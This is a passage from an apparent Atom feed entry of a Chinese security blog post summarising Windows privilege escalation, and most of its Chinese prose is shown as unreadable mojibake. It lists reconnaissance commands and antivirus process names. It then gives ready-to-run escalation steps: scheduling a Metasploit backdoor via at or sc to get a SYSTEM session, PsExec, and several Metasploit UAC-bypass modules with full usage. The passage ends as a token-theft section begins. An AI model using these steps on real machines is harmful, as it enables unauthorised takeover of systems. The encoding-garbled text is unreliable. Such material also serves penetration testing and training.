    <link href="https://sakurahack-y.github.io/2022/03/12/windows%E6%8F%90%E6%9D%83%E6%80%BB%E7%BB%93/"/>
    <id>https://sakurahack-y.github.io/2022/03/12/windows%E6%8F%90%E6%9D%83%E6%80%BB%E7%BB%93/</id>
    <published>2022-03-12T13:09:18.000Z</published>
    <updated>2022-03-12T17:28:24.082Z</updated>
    
    <content type="html"><![CDATA[<h1 id="ç®€ä»‹"><a href="#ç®€ä»‹" class="headerlink" title="ç®€ä»‹"></a>ç®€ä»‹</h1><p>ä¸ºä»€ä¹ˆè¦ææƒï¼šå½“æˆåŠŸé€šè¿‡80æˆ–è€…443ç«¯å£é€šè¿‡webæœåŠ¡æ¸—é€æ—¶ï¼Œå¸¸å¸¸æ˜¯www-data ã€‚æ— æ³•æ‰§è¡Œç®¡ç†å‘˜æƒé™ä¸‹çš„ä¸€ä¸‹å‘½ä»¤æˆ–è€…è¯»å–ä¸€äº›é‡è¦æ–‡ä»¶ã€‚è¿™ä¸ªæ—¶å€™å°±éœ€è¦ææƒï¼Œåœ¨ç®¡ç†å‘˜æƒé™ä¸‹ï¼Œè¿˜å¯ä»¥é€šè¿‡msfvenomç”Ÿæˆå…¶ä»–åé—¨æ–‡ä»¶æˆ–è€…ä¸€äº›éšè—åé—¨ã€‚æ·»åŠ ç”¨æˆ·ï¼Œå¼€å¯å…¶ä»–ç«¯å£ç­‰æ“ä½œï¼Œè¾¾åˆ°æƒé™æŒç»­æ§åˆ¶ã€‚ç‰¹åˆ«æ˜¯windowså­˜åœ¨åŸŸï¼Œæ‰€ä»¥éœ€è¦æœ€é«˜æƒé™ï¼Œæ›´æ–¹ä¾¿åç»­çš„æ¸—é€ã€‚</p><p>ææƒå¯åˆ†ä¸ºçºµå‘ææƒä¸æ¨ªå‘ææƒï¼šçºµå‘ææƒï¼šä½æƒé™è§’è‰²è·å¾—é«˜æƒé™è§’è‰²çš„æƒé™ï¼›æ¨ªå‘ææƒï¼šè·å–åŒçº§åˆ«è§’è‰²çš„æƒé™ã€‚</p><p>Windowså¸¸ç”¨çš„ææƒæ–¹æ³•æœ‰ï¼šç³»ç»Ÿå†…æ ¸æº¢å‡ºæ¼æ´ææƒã€æ•°æ®åº“ææƒã€é”™è¯¯çš„ç³»ç»Ÿé…ç½®ææƒã€ç»„ç­–ç•¥é¦–é€‰é¡¹ææƒã€WEBä¸­é—´ä»¶æ¼æ´ææƒã€DLLåŠ«æŒææƒã€æ»¥ç”¨é«˜å±æƒé™ä»¤ç‰Œææƒã€ç¬¬ä¸‰æ–¹è½¯ä»¶/æœåŠ¡ææƒç­‰</p><h1 id="å¸¸è§„ä¿¡æ¯æœé›†"><a href="#å¸¸è§„ä¿¡æ¯æœé›†" class="headerlink" title="å¸¸è§„ä¿¡æ¯æœé›†"></a>å¸¸è§„ä¿¡æ¯æœé›†</h1><p>çŸ¥å·±çŸ¥å½¼ï¼Œç™¾æˆ˜ä¸æ®†</p><p>å½“ä»¥ä½æƒç”¨æˆ·è¿›å»ä¸€ä¸ªé™Œç”Ÿçš„windowsæœºå™¨åï¼Œæ— è®ºæ˜¯ææƒè¿˜æ˜¯åç»­åšä»€ä¹ˆï¼Œç¬¬ä¸€æ­¥è‚¯å®šè¦å°½å¯èƒ½çš„æœé›†ä¿¡æ¯ã€‚</p><h2 id="å¸¸è§„ä¿¡æ¯æœé›†-1"><a href="#å¸¸è§„ä¿¡æ¯æœé›†-1" class="headerlink" title="å¸¸è§„ä¿¡æ¯æœé›†"></a>å¸¸è§„ä¿¡æ¯æœé›†</h2><pre><code class="text">systeminfo æŸ¥è¯¢ç³»ç»Ÿä¿¡æ¯  hostname ä¸»æœºå  net user æŸ¥çœ‹ç”¨æˆ·ä¿¡æ¯  netstat -ano|find &quot;3389&quot; æŸ¥çœ‹æœåŠ¡pidå·  wmic os get caption æŸ¥çœ‹ç³»ç»Ÿå  wmic qfe get Description,HotFixID,InstalledOn æŸ¥çœ‹è¡¥ä¸ä¿¡æ¯  wmic product get name,version æŸ¥çœ‹å½“å‰å®‰è£…ç¨‹åº  wmic service list brief æŸ¥è¯¢æœ¬æœºæœåŠ¡  wmic process list brief æŸ¥è¯¢æœ¬æœºè¿›ç¨‹  net share æŸ¥çœ‹æœ¬æœºå…±äº«åˆ—è¡¨  netsh firewall show config æŸ¥çœ‹é˜²ç«å¢™é…ç½®</code></pre><h2 id="å¸¸è§çš„æ€è½¯å¦‚ä¸‹ï¼š"><a href="#å¸¸è§çš„æ€è½¯å¦‚ä¸‹ï¼š" class="headerlink" title="å¸¸è§çš„æ€è½¯å¦‚ä¸‹ï¼š"></a>å¸¸è§çš„æ€è½¯å¦‚ä¸‹ï¼š</h2><pre><code class="text">360sd.exe 360æ€æ¯’  360tray.exe 360å®æ—¶ä¿æŠ¤  ZhuDongFangYu.exe 360ä¸»åŠ¨é˜²å¾¡  KSafeTray.exe é‡‘å±±å«å£«  SafeDogUpdateCenter.exe å®‰å…¨ç‹—  McAfee McShield.exe McAfee  egui.exe NOD32  AVP.exe å¡å·´æ–¯åŸº  avguard.exe å°çº¢ä¼  bdagent.exe BitDefender</code></pre><h2 id="è¦æœé›†çš„ä¿¡æ¯å¤§è‡´å¦‚ä¸‹å‡ ç‚¹ï¼š"><a href="#è¦æœé›†çš„ä¿¡æ¯å¤§è‡´å¦‚ä¸‹å‡ ç‚¹ï¼š" class="headerlink" title="è¦æœé›†çš„ä¿¡æ¯å¤§è‡´å¦‚ä¸‹å‡ ç‚¹ï¼š"></a>è¦æœé›†çš„ä¿¡æ¯å¤§è‡´å¦‚ä¸‹å‡ ç‚¹ï¼š</h2><pre><code class="text">æœºå™¨çš„ç³»ç»ŸåŠå…¶ç‰ˆæœ¬æœºå™¨çš„æ‰“è¡¥ä¸æƒ…å†µæœºå™¨å®‰è£…çš„æœåŠ¡æœºå™¨çš„é˜²ç«å¢™ç­–ç•¥é…ç½®æœºå™¨çš„é˜²æŠ¤è½¯ä»¶æƒ…å†µ</code></pre><h1 id="ææƒæ¼æ´"><a href="#ææƒæ¼æ´" class="headerlink" title="ææƒæ¼æ´"></a>ææƒæ¼æ´</h1><h2 id="ç³»ç»Ÿå†…æ ¸æº¢å‡ºæ¼æ´ææƒ"><a href="#ç³»ç»Ÿå†…æ ¸æº¢å‡ºæ¼æ´ææƒ" class="headerlink" title="ç³»ç»Ÿå†…æ ¸æº¢å‡ºæ¼æ´ææƒ"></a>ç³»ç»Ÿå†…æ ¸æº¢å‡ºæ¼æ´ææƒ</h2><h3 id="æ‰‹å·¥æŸ¥æ‰¾è¡¥ä¸æƒ…å†µ"><a href="#æ‰‹å·¥æŸ¥æ‰¾è¡¥ä¸æƒ…å†µ" class="headerlink" title="æ‰‹å·¥æŸ¥æ‰¾è¡¥ä¸æƒ…å†µ"></a>æ‰‹å·¥æŸ¥æ‰¾è¡¥ä¸æƒ…å†µ</h3><pre><code class="text">systeminfo  #æŸ¥çœ‹è¡¥ä¸wmic qfe get Description,HotFixID,InstalledOn  #æŸ¥çœ‹è¡¥ä¸ä¿¡æ¯#Powershellæ‰«æImport-Module C:\Sherlock.ps1Find-AllVulns</code></pre><h3 id="MSFåæ¸—é€æ‰«æ"><a href="#MSFåæ¸—é€æ‰«æ" class="headerlink" title="MSFåæ¸—é€æ‰«æ"></a>MSFåæ¸—é€æ‰«æ</h3><pre><code class="text">post/windows/gather/enum_patches</code></pre><p>åˆ©ç”¨ï¼ˆVulmapã€Wesã€WindowsVulnScanï¼‰å¯¹æ¯”è¡¥ä¸è¿›è€Œè¿›è¡Œææƒ</p><h2 id="atææƒ"><a href="#atææƒ" class="headerlink" title="atææƒ"></a>atææƒ</h2><p><strong>åœ¨Windows2000ã€Windows 2003ã€Windows XP è¿™ä¸‰ç±»ç³»ç»Ÿä¸­ï¼Œæˆ‘ä»¬å¯ä»¥ä½¿ç”¨atå‘½ä»¤å°†Administratoræƒé™æå‡è‡³systemæƒé™ã€‚</strong></p><p>ATå‘½ä»¤æ˜¯Windows XPä¸­å†…ç½®çš„å‘½ä»¤ï¼Œå®ƒä¹Ÿå¯ä»¥åª²ç¾Windowsä¸­çš„â€è®¡åˆ’ä»»åŠ¡â€ï¼Œè€Œä¸”åœ¨è®¡åˆ’çš„å®‰æ’ã€ä»»åŠ¡çš„ç®¡ç†ã€å·¥ä½œäº‹åŠ¡çš„å¤„ç†æ–¹é¢ï¼ŒATå‘½ä»¤å…·æœ‰æ›´å¼ºå¤§æ›´ç¥é€šçš„åŠŸèƒ½ã€‚ATå‘½ä»¤å¯åœ¨æŒ‡å®šæ—¶é—´å’Œæ—¥æœŸã€åœ¨æŒ‡å®šè®¡ç®—æœºä¸Šè¿è¡Œå‘½ä»¤å’Œç¨‹åºã€‚</p><p>å› ä¸ºatå‘½ä»¤é»˜è®¤æ˜¯ä»¥systemæƒé™ä¸‹è¿è¡Œçš„æ‰€ä»¥æˆ‘ä»¬å¯ä»¥åˆ©ç”¨ä»¥ä¸‹å‘½ä»¤ï¼Œè¿›è¡Œææƒ</p><p>at æ—¶é—´ /interactive cmd å…¶ä¸­é‡Œé¢çš„/interactiveå‚æ•°æ˜¯å¼€å¯äº¤äº’æ¨¡å¼</p><p>è®¾ç½®ä¸€ä¸ªå®šæ—¶ä»»åŠ¡ï¼Œåˆ°æ—¶é—´åè‡ªåŠ¨å¼¹å‡ºä¸€ä¸ªcmdçª—å£</p><p><img src="/2022/03/12/windows%E6%8F%90%E6%9D%83%E6%80%BB%E7%BB%93/image-20220312225229034.png" alt="image-20220312225229034"></p><p>æ­¤æ—¶æ¡Œé¢è¿˜æ˜¯</p><p><img src="/2022/03/12/windows%E6%8F%90%E6%9D%83%E6%80%BB%E7%BB%93/image-20220312225516674.png" alt="image-20220312225516674"></p><p>åˆ©ç”¨systemæƒé™æ‰“å¼€ä»»åŠ¡ç®¡ç†å™¨ï¼Œç»“æŸæ¡Œé¢è¿›ç¨‹</p><p><img src="/2022/03/12/windows%E6%8F%90%E6%9D%83%E6%80%BB%E7%BB%93/image-20220312225723090.png" alt="image-20220312225723090"></p><p><img src="/2022/03/12/windows%E6%8F%90%E6%9D%83%E6%80%BB%E7%BB%93/image-20220312225450882.png" alt="image-20220312225450882"></p><p>å†é‡æ–°æ‰“å¼€</p><p><img src="/2022/03/12/windows%E6%8F%90%E6%9D%83%E6%80%BB%E7%BB%93/image-20220312225804841.png" alt="image-20220312225804841"></p><p>ç”±æ­¤å¯ä»¥å®ç°ä¸msfçš„è”åŠ¨</p><p>åœ¨webshllçš„cmdä¸­æ‰§è¡Œ  at æ—¶é—´ /interactive msfçš„åé—¨ç¨‹åºã€‚(æ³¨ï¼šè¿™é‡Œçš„æƒé™ä¸€å®šè¦æ˜¯Administrator)</p><p>ä¼šç›´æ¥åå¼¹å›systemæƒé™çš„ä¼šè¯</p><p><img src="/2022/03/12/windows%E6%8F%90%E6%9D%83%E6%80%BB%E7%BB%93/image-20220312230306281.png" alt="image-20220312230306281"></p><h2 id="scææƒ"><a href="#scææƒ" class="headerlink" title="scææƒ"></a>scææƒ</h2><p><strong>é€‚ç”¨äºwindows 7/8ã€03/08ã€12/16</strong></p><p>å› ä¸ºatå‘½ä»¤åœ¨win7ï¼Œwin8ç­‰æ›´é«˜ç‰ˆæœ¬çš„ç³»ç»Ÿä¸Šéƒ½å·²ç»å–æ¶ˆæ‰äº†ï¼Œæ‰€ä»¥åœ¨ä¸€äº›æ›´é«˜ç‰ˆæœ¬çš„windowsæ“ä½œç³»ç»Ÿä¸Šæˆ‘ä»¬å¯ä»¥ç”¨scå‘½ä»¤è¿›è¡Œææƒ</p><p>SCå‘½ä»¤æ˜¯XPç³»ç»Ÿä¸­åŠŸèƒ½å¼ºå¤§çš„DOSå‘½ä»¤,SCå‘½ä»¤èƒ½ä¸â€æœåŠ¡æ§åˆ¶å™¨â€å’Œå·²å®‰è£…è®¾å¤‡è¿›è¡Œé€šè®¯ã€‚SCæ˜¯ç”¨äºä¸æœåŠ¡æ§åˆ¶ç®¡ç†å™¨å’ŒæœåŠ¡è¿›è¡Œé€šä¿¡çš„å‘½ä»¤è¡Œç¨‹åºã€‚</p><p>ä¹Ÿå°±æ˜¯è¯´ å°±æ˜¯scå¯ä»¥å¯åŠ¨ä¸€ä¸ªæœåŠ¡</p><p>ææƒå‘½ä»¤</p><pre><code class="text">sc Create systemcmd binPath= &quot;cmd /K start&quot; type= own type= interact #è®¾ç½®ä¸€ä¸ªå¯åŠ¨cmdçª—å£çš„æœåŠ¡sc start systemcmd # å¯åŠ¨è¯¥æœåŠ¡åˆ›å»ºä¸€ä¸ªåå«syscmdçš„cmdæœåŠ¡ï¼Œæˆ‘ä»¬ä¹Ÿå¯ä»¥æŠŠbinPathæ¢æˆæœ¨é©¬çš„è·¯å¾„ï¼Œè¿™æ ·å°±å¯ä»¥è·å¾—ä¸€ä¸ªsystemæƒé™çš„ä¼šè¯</code></pre><p>å…¶ä¸­systemcmdæ˜¯æœåŠ¡åç§°ï¼Œå¯ä»¥éšæ„å¡«å†™ï¼Œbinpathæ˜¯å¯åŠ¨çš„å‘½ä»¤ï¼Œtype=ownæ˜¯æŒ‡æœåŠ¡è¿™ä¸ªæœåŠ¡å±äºè°ï¼Œtype=interactã€‚è¿™é‡Œå†è§£é‡Šä¸€ä¸‹ cmd/k start è¿™ä¸ªå‘½ä»¤ï¼Œè¿™ä¸ªå‘½ä»¤å°±æ˜¯å¯åŠ¨ä¸€ä¸ªæ–°çš„cmdçª—å£</p><p><img src="/2022/03/12/windows%E6%8F%90%E6%9D%83%E6%80%BB%E7%BB%93/image-20220312231452287.png" alt="image-20220312231452287"></p><h2 id="psexecææƒ"><a href="#psexecææƒ" class="headerlink" title="psexecææƒ"></a>psexecææƒ</h2><p>**é€‚ç”¨ç‰ˆæœ¬ï¼šWin2003 &amp; Win2008 **</p><p><strong>å¾®è½¯å®˜æ–¹å·¥å…·åŒ…</strong>ï¼š<a href="https://docs.microsoft.com/zh-cn/sysinternals/downloads/pstools">https://docs.microsoft.com/zh-cn/sysinternals/downloads/pstools</a></p><p><strong>ææƒå‘½ä»¤</strong>ï¼š</p><pre><code class="text">PsExec.exe /accepteula /s \\127.0.0.1 cmd #ç›´æ¥äº¤äº’å¼shellpsexec.exe -accepteula -s -i -d cmd.exe #å¼¹å‡ºä¸€ä¸ªcmdçª—å£</code></pre><p>å¼€å¯çš„cmdçª—å£ä¹Ÿæ˜¯systemæƒé™</p><p><img src="/2022/03/12/windows%E6%8F%90%E6%9D%83%E6%80%BB%E7%BB%93/image-20220312232849689.png" alt="image-20220312232849689"></p><h2 id="ç»•è¿‡UACææƒ"><a href="#ç»•è¿‡UACææƒ" class="headerlink" title="ç»•è¿‡UACææƒ"></a>ç»•è¿‡UACææƒ</h2><h3 id="UACç®€ä»‹"><a href="#UACç®€ä»‹" class="headerlink" title="UACç®€ä»‹"></a><strong>UACç®€ä»‹</strong></h3><p><strong>1.ä»€ä¹ˆæ˜¯ç”¨æˆ·å¸æˆ·æ§åˆ¶(UAC)ï¼Ÿ</strong></p><p>Microsoftçš„Windows Vistaå’ŒWindows Server 2008æ“ä½œç³»ç»Ÿå¼•å…¥äº†ä¸€ç§è‰¯å¥½çš„ç”¨æˆ·å¸æˆ·æ§åˆ¶æ¶æ„ï¼Œä»¥é˜²æ­¢ç³»ç»ŸèŒƒå›´å†…çš„æ„å¤–æ›´æ”¹ï¼Œè¿™ç§æ›´æ”¹æ˜¯å¯ä»¥é¢„è§çš„ï¼Œå¹¶ä¸”åªéœ€è¦å¾ˆå°‘çš„æ“ä½œé‡ã€‚</p><p>æ¢å¥è¯è¯´ï¼Œå®ƒæ˜¯Windowsçš„ä¸€ä¸ªå®‰å…¨åŠŸèƒ½ï¼Œå®ƒæ”¯æŒé˜²æ­¢å¯¹æ“ä½œç³»ç»Ÿè¿›è¡Œæœªç»æˆæƒçš„ä¿®æ”¹ï¼ŒUACç¡®ä¿ä»…åœ¨ç®¡ç†å‘˜æˆæƒçš„æƒ…å†µä¸‹è¿›è¡ŒæŸäº›æ›´æ”¹ã€‚å¦‚æœç®¡ç†å‘˜ä¸å…è®¸æ›´æ”¹ï¼Œåˆ™ä¸ä¼šæ‰§è¡Œè¿™äº›æ›´æ”¹ï¼Œå¹¶ä¸”Windowsç³»ç»Ÿä¿æŒä¸å˜ã€‚</p><p><strong>2.UACå¦‚ä½•è¿è¡Œï¼Ÿ</strong></p><p>UACé€šè¿‡é˜»æ­¢ç¨‹åºæ‰§è¡Œä»»ä½•æ¶‰åŠæœ‰å…³ç³»ç»Ÿæ›´æ”¹/ç‰¹å®šä»»åŠ¡çš„ä»»åŠ¡æ¥è¿è¡Œã€‚é™¤éå°è¯•æ‰§è¡Œè¿™äº›æ“ä½œçš„è¿›ç¨‹ä»¥ç®¡ç†å‘˜æƒé™è¿è¡Œï¼Œå¦åˆ™è¿™äº›æ“ä½œå°†æ— æ³•è¿è¡Œã€‚å¦‚æœæ‚¨ä»¥ç®¡ç†å‘˜èº«ä»½è¿è¡Œç¨‹åºï¼Œåˆ™å®ƒå°†å…·æœ‰æ›´å¤šæƒé™ï¼Œå› ä¸ºå®ƒå°†è¢«â€æå‡æƒé™â€ï¼Œè€Œä¸æ˜¯ä»¥ç®¡ç†å‘˜èº«ä»½è¿è¡Œçš„ç¨‹åºã€‚</p><p>ä¸€äº›æ²¡æœ‰ç®¡ç†å‘˜æƒé™æ— æ³•å®Œæˆçš„æ“ä½œï¼š</p><ul><li>æ³¨å†Œè¡¨ä¿®æ”¹ï¼ˆå¦‚æœæ³¨å†Œè¡¨é¡¹åœ¨HKEY_LOCAL_MACHINEä¸‹ï¼ˆå› ä¸ºå®ƒå½±å“å¤šä¸ªç”¨æˆ·ï¼‰ï¼Œå®ƒå°†æ˜¯åªè¯»çš„ï¼‰</li><li>åŠ è½½è®¾å¤‡é©±åŠ¨ç¨‹åº</li><li>DLLæ³¨å…¥</li><li>ä¿®æ”¹ç³»ç»Ÿæ—¶é—´ï¼ˆæ—¶é’Ÿï¼‰</li><li>ä¿®æ”¹ç”¨æˆ·å¸æˆ·æ§åˆ¶è®¾ç½®ï¼ˆé€šè¿‡æ³¨å†Œè¡¨ï¼Œå¯ä»¥å¯ç”¨/ç¦ç”¨è¯¥è®¾ç½®ï¼Œä½†æ‚¨éœ€è¦æ­£ç¡®çš„æƒé™æ‰èƒ½æ‰§è¡Œæ­¤æ“ä½œï¼‰</li><li>ä¿®æ”¹å—ä¿æŠ¤çš„ç›®å½•ï¼ˆä¾‹å¦‚Windowsæ–‡ä»¶å¤¹ï¼ŒProgram Filesï¼‰</li><li>è®¡åˆ’ä»»åŠ¡ï¼ˆä¾‹å¦‚ï¼Œä»¥ç®¡ç†å‘˜æƒé™è‡ªåŠ¨å¯åŠ¨ï¼‰</li></ul><p><strong>UACä¸ä¼šè‡ªåŠ¨é˜»æ­¢æ¶æ„è½¯ä»¶ï¼Œå…¶ç›®çš„ä¸æ˜¯ç¡®å®šç¨‹åºæ˜¯å¦æ˜¯æ¶æ„è½¯ä»¶ã€‚è¿™åŒæ ·å–å†³äºç”¨æˆ·ã€‚å¦‚æœå°†ä»¥ç®¡ç†å‘˜æƒé™æ‰§è¡Œç¨‹åºï¼Œåˆ™å°†æé†’ç”¨æˆ·å¹¶ä¸”éœ€è¦ç”¨æˆ·ç¡®è®¤ã€‚</strong> </p><p><strong>ä¸€èˆ¬æˆ‘ä»¬é€šè¿‡msfæ‹¿åˆ°meterprterçš„ä¼šè¯åï¼Œæˆ‘ä»¬å¯ä»¥é€šè¿‡getsystemæˆ–è€…getuidæ¥æ£€æŸ¥æ˜¯å¦æ˜¯systemæƒé™</strong></p><p>å¦‚æœä¸æ˜¯systemæƒé™ï¼Œæˆ‘ä»¬å¯ä»¥é€šè¿‡ä»¥ä¸‹ç»•è¿‡UACæ¨¡å—å¯¹UACè¿›è¡Œç»•è¿‡ï¼Œåœ¨é€šè¿‡<strong>getsystemè¿›è¡Œææƒ</strong></p><pre><code class="text">#Msfexploit/windows/local/ask #å¼¹å‡ºUACç¡®è®¤çª—å£ï¼Œç‚¹å‡»åè·å¾—systemæƒé™exploit/windows/local/bypassuacexploit/windows/local/bypassuac_injectionexploit/windows/local/bypassuac_fodhelperexploit/windows/local/bypassuac_eventvwrexploit/windows/local/bypassuac_comhijack</code></pre><h3 id="Windowsæƒé™å‡çº§ç»•è¿‡UACä¿æŠ¤"><a href="#Windowsæƒé™å‡çº§ç»•è¿‡UACä¿æŠ¤" class="headerlink" title="Windowsæƒé™å‡çº§ç»•è¿‡UACä¿æŠ¤"></a><strong>Windowsæƒé™å‡çº§ç»•è¿‡UACä¿æŠ¤</strong></h3><p>æ­¤æ¨¡å—å°†é€šè¿‡è¿›ç¨‹æ³¨å…¥ä½¿ç”¨å¯ä¿¡ä»»å‘å¸ƒè€…è¯ä¹¦ç»•è¿‡Windows UACã€‚å®ƒå°†ç”Ÿæˆå…³é—­UACæ ‡å¿—çš„ç¬¬äºŒä¸ªshellã€‚</p><pre><code class="text">msf &gt; use exploit/windows/local/bypassuacmsf exploit windows/local/bypassuac) &gt; set session 1msf exploit(windows/local/bypassuac) &gt; exploit</code></pre><p>ä»ç»™å®šçš„meterpreterä¸­ï¼Œæ‚¨å¯ä»¥çœ‹åˆ°meterpreterä¼šè¯2å·²æ‰“å¼€ï¼Œç°åœ¨ä»¥ä¸‹å‘½ä»¤ä»¥ç¡®å®šsystemæƒé™ç‰¹æƒ.</p><p><img src="/2022/03/12/windows%E6%8F%90%E6%9D%83%E6%80%BB%E7%BB%93/image-20220312235547978.png" alt="image-20220312235547978"></p><h3 id="Windowsæƒé™æå‡ç»•è¿‡UACä¿æŠ¤ï¼ˆå†…å­˜æ³¨å…¥ï¼‰"><a href="#Windowsæƒé™æå‡ç»•è¿‡UACä¿æŠ¤ï¼ˆå†…å­˜æ³¨å…¥ï¼‰" class="headerlink" title="Windowsæƒé™æå‡ç»•è¿‡UACä¿æŠ¤ï¼ˆå†…å­˜æ³¨å…¥ï¼‰"></a><strong>Windowsæƒé™æå‡ç»•è¿‡UACä¿æŠ¤ï¼ˆå†…å­˜æ³¨å…¥ï¼‰</strong></h3><p>æ­¤æ¨¡å—å°†é€šè¿‡è¿›ç¨‹æ³¨å…¥ä½¿ç”¨å¯ä¿¡ä»»çš„å‘å¸ƒè€…è¯ä¹¦ç»•è¿‡Windows UACã€‚å®ƒå°†ç”Ÿæˆå…³é—­UACæ ‡å¿—çš„ç¬¬äºŒä¸ªshellã€‚åœ¨æ™®é€šæŠ€æœ¯ä¸­ï¼Œè¯¥æ¨¡å—ä½¿ç”¨åå°„å¼DLLæ³¨å…¥æŠ€æœ¯å¹¶åªé™¤å»äº†DLL payload  äºŒè¿›åˆ¶æ–‡ä»¶ï¼Œè€Œä¸æ˜¯ä¸‰ä¸ªå•ç‹¬çš„äºŒè¿›åˆ¶æ–‡ä»¶ã€‚ä½†æ˜¯ï¼Œå®ƒéœ€è¦é€‰æ‹©æ­£ç¡®çš„ä½“ç³»æ¶æ„ï¼ˆå¯¹äºSYSWOW64ç³»ç»Ÿä¹Ÿä½¿ç”¨x64ï¼‰ã€‚å¦‚æœæŒ‡å®šexe::customï¼Œåº”åœ¨å•ç‹¬çš„è¿›ç¨‹ä¸­å¯åŠ¨ payload åè°ƒç”¨ExitProcessï¼ˆï¼‰ã€‚</p><pre><code class="text">msf &gt; use exploit/windows/local/bypassuac_injectionmsf exploit(windows/local/bypassuac_injection) &gt; set session 1msf exploit(windows/local/bypassuac_injection) &gt; exploit</code></pre><p><img src="/2022/03/12/windows%E6%8F%90%E6%9D%83%E6%80%BB%E7%BB%93/image-20220312235641548.png" alt="image-20220312235641548"></p><h3 id="ç»•è¿‡Windows-UACä¿æŠ¤ï¼ˆé€šè¿‡FodHelperæ³¨å†Œè¡¨é¡¹ï¼‰"><a href="#ç»•è¿‡Windows-UACä¿æŠ¤ï¼ˆé€šè¿‡FodHelperæ³¨å†Œè¡¨é¡¹ï¼‰" class="headerlink" title="ç»•è¿‡Windows UACä¿æŠ¤ï¼ˆé€šè¿‡FodHelperæ³¨å†Œè¡¨é¡¹ï¼‰"></a><strong>ç»•è¿‡Windows UACä¿æŠ¤ï¼ˆé€šè¿‡FodHelperæ³¨å†Œè¡¨é¡¹ï¼‰</strong></h3><p>æ­¤æ¨¡å—å°†é€šè¿‡åœ¨å½“å‰ç”¨æˆ·é…ç½®å•å…ƒä¸‹åŠ«æŒæ³¨å†Œè¡¨ä¸­çš„ç‰¹æ®Šé”®å¹¶æ’å…¥å°†åœ¨å¯åŠ¨Windows fodhelper.exeåº”ç”¨ç¨‹åºæ—¶è°ƒç”¨çš„è‡ªå®šä¹‰å‘½ä»¤æ¥ç»•è¿‡Windows 10 UACã€‚å®ƒå°†ç”Ÿæˆå…³é—­UACæ ‡å¿—çš„ç¬¬äºŒä¸ªshellã€‚æ­¤æ¨¡å—ä¿®æ”¹æ³¨å†Œè¡¨é¡¹ï¼Œä½†åœ¨è°ƒç”¨payloadåå°†æ¸…é™¤è¯¥é¡¹ã€‚è¯¥æ¨¡å—ä¸éœ€è¦payloadçš„ä½“ç³»æ¶æ„å’Œæ“ä½œç³»ç»ŸåŒ¹é…ã€‚å¦‚æœæŒ‡å®šexe:customï¼Œåˆ™åº”åœ¨å•ç‹¬çš„è¿›ç¨‹ä¸­å¯åŠ¨payloadåè°ƒç”¨ExitProcessï¼ˆï¼‰ã€‚</p><pre><code class="text">msf &gt; use exploit/windows/local/bypassuac_fodhelpermsf exploit(windows/local/bypassuac_fodhelper) &gt; set session 1msf exploit(windows/local/bypassuac_fodhelper) &gt; exploit</code></pre><p><img src="/2022/03/12/windows%E6%8F%90%E6%9D%83%E6%80%BB%E7%BB%93/image-20220312235727956.png" alt="image-20220312235727956"></p><h3 id="Windowsæƒé™å‡çº§ç»•è¿‡UACä¿æŠ¤ï¼ˆé€šè¿‡Eventvwræ³¨å†Œè¡¨é¡¹ï¼‰"><a href="#Windowsæƒé™å‡çº§ç»•è¿‡UACä¿æŠ¤ï¼ˆé€šè¿‡Eventvwræ³¨å†Œè¡¨é¡¹ï¼‰" class="headerlink" title="Windowsæƒé™å‡çº§ç»•è¿‡UACä¿æŠ¤ï¼ˆé€šè¿‡Eventvwræ³¨å†Œè¡¨é¡¹ï¼‰"></a><strong>Windowsæƒé™å‡çº§ç»•è¿‡UACä¿æŠ¤ï¼ˆé€šè¿‡Eventvwræ³¨å†Œè¡¨é¡¹ï¼‰</strong></h3><p>æ­¤æ¨¡å—å°†é€šè¿‡åœ¨å½“å‰ç”¨æˆ·é…ç½®å•å…ƒä¸‹åŠ«æŒæ³¨å†Œè¡¨ä¸­çš„ç‰¹æ®Šé”®å¹¶æ’å…¥å°†åœ¨å¯åŠ¨Windowsäº‹ä»¶æŸ¥çœ‹å™¨æ—¶è°ƒç”¨çš„è‡ªå®šä¹‰å‘½ä»¤æ¥ç»•è¿‡Windows UACã€‚å®ƒå°†ç”Ÿæˆå…³é—­UACæ ‡å¿—çš„ç¬¬äºŒä¸ªshellã€‚æ­¤æ¨¡å—ä¿®æ”¹æ³¨å†Œè¡¨é¡¹ï¼Œä½†åœ¨è°ƒç”¨payloadåå°†æ¸…é™¤è¯¥é¡¹ã€‚è¯¥æ¨¡å—ä¸éœ€è¦payloadçš„ä½“ç³»æ¶æ„å’Œæ“ä½œç³»ç»ŸåŒ¹é…ã€‚å¦‚æœæŒ‡å®šEXE ::Customï¼Œåˆ™åº”åœ¨å•ç‹¬çš„è¿›ç¨‹ä¸­å¯åŠ¨payloadåè°ƒç”¨ExitProcessï¼ˆï¼‰ã€‚</p><pre><code class="text">msf &gt; use exploit/windows/local/bypassuac_eventvwrmsf exploit(windows/local/bypassuac_eventvwr) &gt; set session 1msf exploit(windows/local/bypassuac_eventvwr) &gt; exploit</code></pre><p><img src="/2022/03/12/windows%E6%8F%90%E6%9D%83%E6%80%BB%E7%BB%93/image-20220312235806004.png" alt="image-20220312235806004"></p><h3 id="Windowsæƒé™å‡çº§ç»•è¿‡UACä¿æŠ¤ï¼ˆé€šè¿‡COMå¤„ç†ç¨‹åºåŠ«æŒï¼‰"><a href="#Windowsæƒé™å‡çº§ç»•è¿‡UACä¿æŠ¤ï¼ˆé€šè¿‡COMå¤„ç†ç¨‹åºåŠ«æŒï¼‰" class="headerlink" title="Windowsæƒé™å‡çº§ç»•è¿‡UACä¿æŠ¤ï¼ˆé€šè¿‡COMå¤„ç†ç¨‹åºåŠ«æŒï¼‰"></a><strong>Windowsæƒé™å‡çº§ç»•è¿‡UACä¿æŠ¤ï¼ˆé€šè¿‡COMå¤„ç†ç¨‹åºåŠ«æŒï¼‰</strong></h3><pre><code class="text">msf &gt; use exploit/windows/local/bypassuac_comhijackmsf exploit(windows/local/bypassuac_comhijack) &gt; set session 1msf exploit(windows/local/bypassuac_comhijack) &gt; exploit</code></pre><p><img src="/2022/03/12/windows%E6%8F%90%E6%9D%83%E6%80%BB%E7%BB%93/image-20220312235844933.png" alt="image-20220312235844933"></p><h2 id="ä»¤ç‰Œçªƒå–"><a href="#ä»¤ç‰Œçªƒå–" class="headerlink" title="ä»¤ç‰Œçªƒå–"></a><strong>ä»¤ç‰Œçªƒå–</strong></h2><p><strong>é€‚ç”¨äº2008ä¹‹å‰ç‰ˆæœ¬</strong></p><p><strong>ä»¤ç‰Œç®€ä»‹</strong></p><p>æè¿°è¿›ç¨‹æˆ–è€…çº¿ç¨‹å®‰å…¨ä¸Šä¸‹æ–‡çš„ä¸€ä¸ªå¯¹è±¡ã€‚ä¸åŒçš„ç”¨æˆ·ç™»å½•è®¡ç®—æœºåï¼Œ éƒ½ä¼šç”Ÿæˆä¸€ä¸ªAccess 